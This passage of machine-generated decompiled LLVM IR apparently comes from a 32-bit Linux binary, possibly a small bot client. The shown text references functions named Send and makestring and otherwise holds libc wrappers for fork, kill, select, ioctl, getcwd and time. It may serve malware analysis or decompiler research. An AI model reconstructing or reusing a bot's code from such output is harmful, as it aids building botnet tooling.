  uselistorder i32 %storemerge12, { 0, 3, 1, 4, 2 }
  uselistorder i8* %stack_var_-6840.2.ph, { 2, 3, 1, 0 }
  uselistorder i8* %v3_8049bb8.pre, { 3, 2, 0, 1 }
  uselistorder i32 %v0_8049b83, { 2, 1, 0 }
  uselistorder i32 %.pre74, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8049b55, { 1, 0 }
  uselistorder i32 %storemerge13, { 0, 3, 1, 4, 2 }
  uselistorder i32 %v5_8049b23, { 1, 0 }
  uselistorder i8* %v0_8049b18, { 4, 0, 3, 2, 1, 6, 5, 7 }
  uselistorder i32 %v4_8049ad6, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8049aac, { 2, 1, 0 }
  uselistorder i32 %v1_8049aa4, { 1, 0 }
  uselistorder i32 %v0_8049a9d, { 2, 0, 1 }
  uselistorder i32 %stack_var_-40.3.lcssa, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_8049ac753, { 1, 0 }
  uselistorder i32 %v0_8049a78, { 1, 0 }
  uselistorder i32 %v4_8049a66, { 1, 2, 0 }
  uselistorder i32 %v2_8049a4a, { 2, 0, 1 }
  uselistorder i32 %storemerge15174, { 1, 0 }
  uselistorder i32 %v1_8049a33, { 1, 3, 2, 0 }
  uselistorder i32 %v2_80499d9, { 1, 2, 0 }
  uselistorder i32 %v2_80499cf, { 1, 0, 2 }
  uselistorder i32 %v4_80499f3, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80499dc170, { 1, 0 }
  uselistorder i32 %v2_80499cf163, { 2, 1, 0 }
  uselistorder i32 %.pre, { 1, 5, 2, 3, 0, 6, 4 }
  uselistorder i32 %v2_804999c, { 1, 0 }
  uselistorder i32 %storemerge14181, { 1, 0 }
  uselistorder i1 %v10_8049a94177, { 1, 0 }
  uselistorder i32 %v1_8049940, { 1, 0 }
  uselistorder i32 %v2_8049938, { 1, 0 }
  uselistorder i32 %v0_8049931, { 1, 0 }
  uselistorder i8* %stack_var_-6840.1.ph.ph146, { 0, 2, 1 }
  uselistorder i32 %v2_8049b9e, { 3, 2, 4, 1, 0 }
  uselistorder i8* %tmp137, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8049838, { 1, 0, 2 }
  uselistorder i32 %stack_var_-6836.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_804980d, { 3, 1, 2, 0 }
  uselistorder i32 %v3_80497ea, { 1, 2, 0 }
  uselistorder i32 %v2_80497c8, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %storemerge17198, { 1, 0 }
  uselistorder i32 %v3_8049710, { 2, 1, 0, 3, 4 }
  uselistorder i8* %tmp133, { 1, 0, 2 }
  uselistorder i32 %v2_8049694, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v7_8049641, { 1, 0 }
  uselistorder i32 %v3_804970d10, { 1, 0 }
  uselistorder i32 %stack_var_-80.0, { 5, 4, 1, 0, 3, 2, 6 }
  uselistorder i32* %tmp129, { 1, 0, 2 }
  uselistorder i1 %v5_8049584, { 2, 5, 1, 0, 4, 3 }
  uselistorder i32* %v2_8049575, { 3, 4, 5, 6, 0, 1, 2, 7 }
  uselistorder i32 %v2_8049552, { 1, 2, 7, 6, 0, 8, 9, 3, 4, 5, 11, 10, 12 }
  uselistorder i32* %stack_var_4, { 1, 0, 2 }
  uselistorder i8** %stack_var_-6864, { 16, 17, 18, 19, 15, 14, 13, 20, 12, 11, 10, 9, 7, 6, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-664, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-1688, { 1, 0, 2 }
  uselistorder i8** %stack_var_-32, { 9, 8, 7, 6, 0, 5, 4, 3, 10, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 26, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 20, 21, 0, 1, 6, 7, 2, 3, 4, 5, 86, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 22, 23, 26, 27, 24, 25, 39, 28, 29, 31, 30, 84, 32, 34, 33, 83, 35, 36, 37, 38, 85, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 57, 51, 52, 53, 54, 55, 56, 87, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82 }
  uselistorder i1* %cf.global-to-local, { 20, 21, 1, 2, 3, 6, 4, 5, 77, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 22, 23, 24, 31, 25, 26, 27, 28, 29, 30, 76, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 47, 45, 46, 78, 48, 49, 50, 51, 52, 55, 56, 57, 58, 59, 53, 54, 63, 64, 60, 61, 62, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75 }
  uselistorder [4 x i8]** @global_var_8054080.304, { 1, 0 }
  uselistorder i32 (i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32* @global_var_8056a2c.257, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @global_var_8054390.256, { 5, 6, 1, 7, 8, 9, 2, 0, 10, 3, 11, 4, 12, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @Send, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @makestring, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_80511ed.283 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ()* @__libc_fork, { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_805122b.291 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8051110.258 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([19 x i8]* @global_var_8051218.290 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_8049cb6, { 1, 0 }
  uselistorder label %dec_label_pc_8049c23, { 1, 0 }
  uselistorder label %dec_label_pc_8049bb5, { 1, 0 }
  uselistorder label %dec_label_pc_8049bb5.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8049b35, { 1, 0 }
  uselistorder label %dec_label_pc_8049a8c, { 1, 0 }
  uselistorder label %dec_label_pc_8049a73, { 1, 0 }
  uselistorder label %dec_label_pc_8049a47, { 1, 0 }
  uselistorder label %dec_label_pc_80499cc, { 1, 0 }
  uselistorder label %dec_label_pc_8049999, { 1, 0 }
  uselistorder label %dec_label_pc_8049918, { 1, 0 }
  uselistorder label %dec_label_pc_8049918.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8049918.outer.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80498c9, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80497c5, { 1, 0 }
  uselistorder label %dec_label_pc_8049777, { 1, 0 }
  uselistorder label %dec_label_pc_8049764, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804965f, { 1, 0 }
  uselistorder label %dec_label_pc_80495bd, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049cc8 = load i32, i32* @edi, align 4
  store i32 %v0_8049cc8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8049cd0 = load i32, i32* @ebx, align 4
  %v1_8049cd8 = call i32 @close(i32 %arg1)
  store i32 %v0_8049cd0, i32* @ebx, align 4
  store i32 %v1_8049cd8, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8049cd8, -4095
  br i1 %tmp8, label %dec_label_pc_8049cf0, label %dec_label_pc_8049ce4

dec_label_pc_8049ce4:                             ; preds = %entry
  %v1_8049ce4 = call i32 @__errno_location(i32 %v0_8049cd0)
  %v0_8049ce9 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049ce9 = sub i32 0, %v0_8049ce9
  %v2_8049ceb = inttoptr i32 %v1_8049ce4 to i32*
  store i32 %v1_8049ce9, i32* %v2_8049ceb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049cf0

dec_label_pc_8049cf0:                             ; preds = %entry, %dec_label_pc_8049ce4
  %v0_8049cf0 = phi i32 [ %v1_8049cd8, %entry ], [ -1, %dec_label_pc_8049ce4 ]
  %v2_8049cf4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049cf4, i32* @edi, align 4
  ret i32 %v0_8049cf0

; uselistorder directives
  uselistorder i32 %v1_8049cd8, { 1, 0, 2 }
  uselistorder i32 %v0_8049cd0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049cf0, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049cf8 = load i32, i32* @ebx, align 4
  store i32 %v0_8049cf8, i32* %stack_var_-4, align 4
  %v1_8049d01 = call i32 @fork(i32 %v0_8049cf8)
  store i32 %v1_8049d01, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8049d01, -4095
  br i1 %tmp6, label %dec_label_pc_8049d18, label %dec_label_pc_8049d0c

dec_label_pc_8049d0c:                             ; preds = %entry
  %v0_8049d0c = load i32, i32* %stack_var_-4, align 4
  %v1_8049d0c = call i32 @__errno_location(i32 %v0_8049d0c)
  %v0_8049d11 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049d11 = sub i32 0, %v0_8049d11
  %v2_8049d13 = inttoptr i32 %v1_8049d0c to i32*
  store i32 %v1_8049d11, i32* %v2_8049d13, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049d18

dec_label_pc_8049d18:                             ; preds = %entry, %dec_label_pc_8049d0c
  %v0_8049d18 = phi i32 [ %v1_8049d01, %entry ], [ -1, %dec_label_pc_8049d0c ]
  %v2_8049d1a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049d1a, i32* @edx, align 4
  %v2_8049d1c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049d1c, i32* @ebx, align 4
  ret i32 %v0_8049d18

; uselistorder directives
  uselistorder i32 %v1_8049d01, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049d18, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-44, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %v0_8049d20 = load i32, i32* @ebp, align 4
  %v0_8049d21 = load i32, i32* @edi, align 4
  %v0_8049d22 = load i32, i32* @esi, align 4
  %v0_8049d23 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8049d2f = icmp eq i32 %arg2, 0
  %v1_8049d31 = icmp eq i1 %v1_8049d2f, false
  br i1 %v1_8049d31, label %dec_label_pc_8049d5c, label %dec_label_pc_8049d33

dec_label_pc_8049d33:                             ; preds = %entry
  %v1_8049d33 = icmp eq i32 %arg1, 0
  br i1 %v1_8049d33, label %dec_label_pc_8049d47, label %dec_label_pc_8049d37

dec_label_pc_8049d37:                             ; preds = %dec_label_pc_8049d33
  %v1_8049d37 = call i32 @__errno_location(i32 %v0_8049d23)
  %v1_8049d3c = inttoptr i32 %v1_8049d37 to i32*
  store i32 22, i32* %v1_8049d3c, align 4
  br label %dec_label_pc_8049dcd

dec_label_pc_8049d47:                             ; preds = %dec_label_pc_8049d33
  %v3_8049d47 = call i32 @__GI_getpagesize(i32 %v0_8049d23, i32 %v0_8049d22, i32 %v0_8049d21)
  store i32 %v3_8049d47, i32* @ebx, align 4
  %v5_8049d53 = icmp slt i32 %v3_8049d47, 4096
  br i1 %v5_8049d53, label %dec_label_pc_8049d55, label %dec_label_pc_8049d64

dec_label_pc_8049d55:                             ; preds = %dec_label_pc_8049d47
  store i32 4096, i32* @ebx, align 4
  br label %dec_label_pc_8049d64

dec_label_pc_8049d5c:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8049d60 = icmp eq i32 %arg1, 0
  %v1_8049d62 = icmp eq i1 %v1_8049d60, false
  br i1 %v1_8049d62, label %dec_label_pc_8049d76, label %dec_label_pc_8049d64

dec_label_pc_8049d64:                             ; preds = %dec_label_pc_8049d47, %dec_label_pc_8049d5c, %dec_label_pc_8049d55
  %v0_8049d67 = phi i32 [ %v3_8049d47, %dec_label_pc_8049d47 ], [ %arg2, %dec_label_pc_8049d5c ], [ 4096, %dec_label_pc_8049d55 ]
  store i32 %v0_8049d67, i32* %stack_var_-44, align 4
  %v1_8049d68 = call i32 @malloc(i32 %v0_8049d67)
  store i32 %v1_8049d68, i32* @esi, align 4
  %v1_8049d72 = icmp eq i32 %v1_8049d68, 0
  br i1 %v1_8049d72, label %dec_label_pc_8049dcd, label %dec_label_pc_8049d64.dec_label_pc_8049d76_crit_edge

dec_label_pc_8049d64.dec_label_pc_8049d76_crit_edge: ; preds = %dec_label_pc_8049d64
  %v0_8049d81.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_8049d76

dec_label_pc_8049d76:                             ; preds = %dec_label_pc_8049d64.dec_label_pc_8049d76_crit_edge, %dec_label_pc_8049d5c
  %v0_8049d81 = phi i32 [ %v0_8049d81.pre, %dec_label_pc_8049d64.dec_label_pc_8049d76_crit_edge ], [ %tmp11, %dec_label_pc_8049d5c ]
  %v0_8049d76 = phi i32 [ %v1_8049d68, %dec_label_pc_8049d64.dec_label_pc_8049d76_crit_edge ], [ %arg1, %dec_label_pc_8049d5c ]
  store i32 %v0_8049d76, i32* @ebx, align 4
  %v2_8049d81 = call i32 @getcwd(i32 %v0_8049d81, i32 %tmp12)
  %v0_8049d83 = load i32, i32* @ebx, align 4
  store i32 %v0_8049d83, i32* @edx, align 4
  store i32 %v2_8049d81, i32* @ebx, align 4
  %tmp18 = icmp ult i32 %v2_8049d81, -4095
  br i1 %tmp18, label %dec_label_pc_8049d99, label %dec_label_pc_8049d8e

dec_label_pc_8049d8e:                             ; preds = %dec_label_pc_8049d76
  %v0_8049d8e = load i32, i32* %stack_var_-44, align 4
  %v1_8049d8e = call i32 @__errno_location(i32 %v0_8049d8e)
  %v0_8049d93 = load i32, i32* @ebx, align 4
  %v1_8049d93 = sub i32 0, %v0_8049d93
  store i32 %v1_8049d93, i32* @ebx, align 4
  %v2_8049d95 = inttoptr i32 %v1_8049d8e to i32*
  store i32 %v1_8049d93, i32* %v2_8049d95, align 4
  br label %dec_label_pc_8049dbb

dec_label_pc_8049d99:                             ; preds = %dec_label_pc_8049d76
  %v2_8049d99 = icmp slt i32 %v2_8049d81, 0
  br i1 %v2_8049d99, label %dec_label_pc_8049dbb, label %dec_label_pc_8049d9d

dec_label_pc_8049d9d:                             ; preds = %dec_label_pc_8049d99
  %v0_8049d9d = load i32, i32* @edi, align 4
  %v1_8049d9d = icmp eq i32 %v0_8049d9d, 0
  %v1_8049d9f = icmp eq i1 %v1_8049d9d, false
  br i1 %v1_8049d9f, label %dec_label_pc_8049dcf, label %dec_label_pc_8049da1

dec_label_pc_8049da1:                             ; preds = %dec_label_pc_8049d9d
  br i1 %v1_8049d31, label %dec_label_pc_8049db7, label %dec_label_pc_8049da5

dec_label_pc_8049da5:                             ; preds = %dec_label_pc_8049da1
  %v0_8049da8 = load i32, i32* @esi, align 4
  store i32 %v0_8049da8, i32* %stack_var_-44, align 4
  %v4_8049da9 = inttoptr i32 %v0_8049da8 to i32*
  %v5_8049da9 = call i32 @realloc(i32* %v4_8049da9, i32 %v2_8049d81, i32 %v0_8049d83, i32 %v0_8049d83)
  %v1_8049db3 = icmp eq i32 %v5_8049da9, 0
  %v1_8049db5 = icmp eq i1 %v1_8049db3, false
  br i1 %v1_8049db5, label %dec_label_pc_8049dcf, label %dec_label_pc_8049db7

dec_label_pc_8049db7:                             ; preds = %dec_label_pc_8049da5, %dec_label_pc_8049da1
  %v0_8049db7 = load i32, i32* @esi, align 4
  br label %dec_label_pc_8049dcf

dec_label_pc_8049dbb:                             ; preds = %dec_label_pc_8049d99, %dec_label_pc_8049d8e
  %v0_8049dbb = load i32, i32* @edi, align 4
  %v1_8049dbb = icmp eq i32 %v0_8049dbb, 0
  %v1_8049dbd = icmp eq i1 %v1_8049dbb, false
  br i1 %v1_8049dbd, label %dec_label_pc_8049dcd, label %dec_label_pc_8049dbf

dec_label_pc_8049dbf:                             ; preds = %dec_label_pc_8049dbb
  %v0_8049dc2 = load i32, i32* @esi, align 4
  store i32 %v0_8049dc2, i32* %stack_var_-44, align 4
  %v1_8049dc3 = call i32 @free(i32 %v0_8049dc2)
  %v0_8049dd2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8049dcf

dec_label_pc_8049dcd:                             ; preds = %dec_label_pc_8049dbb, %dec_label_pc_8049d64, %dec_label_pc_8049d37
  br label %dec_label_pc_8049dcf

dec_label_pc_8049dcf:                             ; preds = %dec_label_pc_8049da5, %dec_label_pc_8049d9d, %dec_label_pc_8049dbf, %dec_label_pc_8049db7, %dec_label_pc_8049dcd
  %v0_8049dd2 = phi i32 [ %v5_8049da9, %dec_label_pc_8049da5 ], [ %v0_8049d9d, %dec_label_pc_8049d9d ], [ %v0_8049dd2.pre, %dec_label_pc_8049dbf ], [ %v0_8049db7, %dec_label_pc_8049db7 ], [ 0, %dec_label_pc_8049dcd ]
  store i32 %v0_8049d23, i32* @ebx, align 4
  store i32 %v0_8049d22, i32* @esi, align 4
  store i32 %v0_8049d21, i32* @edi, align 4
  store i32 %v0_8049d20, i32* @ebp, align 4
  ret i32 %v0_8049dd2

; uselistorder directives
  uselistorder i32 %v2_8049d81, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8049d68, { 0, 2, 1 }
  uselistorder i32 %v0_8049d67, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder i32 %arg1, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_8049dcf, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8049d64, { 1, 2, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8049ddc = load i32, i32* @global_var_80569d0.307, align 16
  %v1_8049de6 = icmp eq i32 %v0_8049ddc, 0
  br i1 %v1_8049de6, label %dec_label_pc_8049dec, label %dec_label_pc_8049dea

dec_label_pc_8049dea:                             ; preds = %entry
  br label %dec_label_pc_8049dec

dec_label_pc_8049dec:                             ; preds = %entry, %dec_label_pc_8049dea
  %storemerge = phi i32 [ %v0_8049ddc, %dec_label_pc_8049dea ], [ 4096, %entry ]
  %v0_8049dec = phi i32 [ %v0_8049ddc, %dec_label_pc_8049dea ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8049dec

; uselistorder directives
  uselistorder label %dec_label_pc_8049dec, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049df0 = load i32, i32* @ebx, align 4
  store i32 %v0_8049df0, i32* %stack_var_-4, align 4
  %v1_8049df9 = call i32 @getpid(i32 %v0_8049df0)
  store i32 %v1_8049df9, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8049df9, -4095
  br i1 %tmp6, label %dec_label_pc_8049e10, label %dec_label_pc_8049e04

dec_label_pc_8049e04:                             ; preds = %entry
  %v0_8049e04 = load i32, i32* %stack_var_-4, align 4
  %v1_8049e04 = call i32 @__errno_location(i32 %v0_8049e04)
  %v0_8049e09 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049e09 = sub i32 0, %v0_8049e09
  %v2_8049e0b = inttoptr i32 %v1_8049e04 to i32*
  store i32 %v1_8049e09, i32* %v2_8049e0b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049e10

dec_label_pc_8049e10:                             ; preds = %entry, %dec_label_pc_8049e04
  %v0_8049e10 = phi i32 [ %v1_8049df9, %entry ], [ -1, %dec_label_pc_8049e04 ]
  %v2_8049e14 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049e14, i32* @ebx, align 4
  ret i32 %v0_8049e10

; uselistorder directives
  uselistorder i32 %v1_8049df9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049e10, { 1, 0 }
}

define i32 @getppid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049e18 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e18, i32* %stack_var_-4, align 4
  %v1_8049e21 = call i32 @getppid(i32 %v0_8049e18)
  store i32 %v1_8049e21, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8049e21, -4095
  br i1 %tmp6, label %dec_label_pc_8049e38, label %dec_label_pc_8049e2c

dec_label_pc_8049e2c:                             ; preds = %entry
  %v0_8049e2c = load i32, i32* %stack_var_-4, align 4
  %v1_8049e2c = call i32 @__errno_location(i32 %v0_8049e2c)
  %v0_8049e31 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049e31 = sub i32 0, %v0_8049e31
  %v2_8049e33 = inttoptr i32 %v1_8049e2c to i32*
  store i32 %v1_8049e31, i32* %v2_8049e33, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049e38

dec_label_pc_8049e38:                             ; preds = %entry, %dec_label_pc_8049e2c
  %v0_8049e38 = phi i32 [ %v1_8049e21, %entry ], [ -1, %dec_label_pc_8049e2c ]
  %v2_8049e3c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049e3c, i32* @ebx, align 4
  ret i32 %v0_8049e38

; uselistorder directives
  uselistorder i32 %v1_8049e21, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @getppid, { 1, 0 }
  uselistorder label %dec_label_pc_8049e38, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8049e40 = load i32, i32* @edi, align 4
  store i32 %v0_8049e40, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8049e58 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8049e60 = call i32 @ioctl(i32 %v0_8049e58, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8049e58, i32* @ebx, align 4
  store i32 %v3_8049e60, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_8049e60, -4095
  br i1 %tmp11, label %dec_label_pc_8049e78, label %dec_label_pc_8049e6c

dec_label_pc_8049e6c:                             ; preds = %entry
  %v1_8049e6c = call i32 @__errno_location(i32 %v0_8049e58)
  %v0_8049e71 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049e71 = sub i32 0, %v0_8049e71
  %v2_8049e73 = inttoptr i32 %v1_8049e6c to i32*
  store i32 %v1_8049e71, i32* %v2_8049e73, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049e78

dec_label_pc_8049e78:                             ; preds = %entry, %dec_label_pc_8049e6c
  %v0_8049e78 = phi i32 [ %v3_8049e60, %entry ], [ -1, %dec_label_pc_8049e6c ]
  %v2_8049e7d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049e7d, i32* @edi, align 4
  ret i32 %v0_8049e78

; uselistorder directives
  uselistorder i32 %v3_8049e60, { 1, 0, 2 }
  uselistorder i32 %v0_8049e58, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049e78, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049e80 = load i32, i32* @ebx, align 4
  store i32 %v0_8049e80, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8049e93 = call i32 @kill(i32 %v0_8049e80, i32 %tmp4)
  store i32 %v2_8049e93, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_8049e93, -4095
  br i1 %tmp8, label %dec_label_pc_8049eac, label %dec_label_pc_8049ea0

dec_label_pc_8049ea0:                             ; preds = %entry
  %v0_8049ea0 = load i32, i32* %stack_var_-4, align 4
  %v1_8049ea0 = call i32 @__errno_location(i32 %v0_8049ea0)
  %v0_8049ea5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049ea5 = sub i32 0, %v0_8049ea5
  %v2_8049ea7 = inttoptr i32 %v1_8049ea0 to i32*
  store i32 %v1_8049ea5, i32* %v2_8049ea7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049eac

dec_label_pc_8049eac:                             ; preds = %entry, %dec_label_pc_8049ea0
  %v0_8049eac = phi i32 [ %v2_8049e93, %entry ], [ -1, %dec_label_pc_8049ea0 ]
  %v2_8049eae = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049eae, i32* @edx, align 4
  %v2_8049eb0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049eb0, i32* @ebx, align 4
  ret i32 %v0_8049eac

; uselistorder directives
  uselistorder i32 %v2_8049e93, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049eac, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049eb5 = load i32, i32* @esi, align 4
  store i32 %v0_8049eb5, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8049ecd = load i32, i32* @ebx, align 4
  %v1_8049ed5 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8049ecd, i32* @ebx, align 4
  store i32 %v1_8049ed5, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_8049ed5, -4095
  br i1 %tmp11, label %dec_label_pc_8049eed, label %dec_label_pc_8049ee1

dec_label_pc_8049ee1:                             ; preds = %entry
  %v1_8049ee1 = call i32 @__errno_location(i32 %v0_8049ecd)
  %v0_8049ee6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8049ee6 = sub i32 0, %v0_8049ee6
  %v2_8049ee8 = inttoptr i32 %v1_8049ee1 to i32*
  store i32 %v1_8049ee6, i32* %v2_8049ee8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8049eed

dec_label_pc_8049eed:                             ; preds = %entry, %dec_label_pc_8049ee1
  %v0_8049eed = phi i32 [ %v1_8049ed5, %entry ], [ -1, %dec_label_pc_8049ee1 ]
  %v2_8049ef0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049ef0, i32* @esi, align 4
  ret i32 %v0_8049eed

; uselistorder directives
  uselistorder i32 %v1_8049ed5, { 1, 0, 2 }
  uselistorder i32 %v0_8049ecd, { 1, 0 }
  uselistorder label %dec_label_pc_8049eed, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8049ef4 = load i32, i32* @edi, align 4
  store i32 %v0_8049ef4, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8049efc = load i32, i32* @ebx, align 4
  %v2_8049f04 = call i32 @time(i32* %arg1)
  store i32 %v0_8049efc, i32* @ebx, align 4
  store i32 %v2_8049f04, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8049f04, -4095
  br i1 %tmp9, label %dec_label_pc_8049f1c, label %dec_label_pc_8049f10

dec_label_pc_8049f10:                             ; preds = %entry
  %v1_8049f10 = call i32 @__errno_location(i32 %v0_8049efc)
  %v0_8049f15 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049f15 = sub i32 0, %v0_8049f15
  %v2_8049f17 = inttoptr i32 %v1_8049f10 to i32*
  store i32 %v1_8049f15, i32* %v2_8049f17, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049f1c

dec_label_pc_8049f1c:                             ; preds = %entry, %dec_label_pc_8049f10
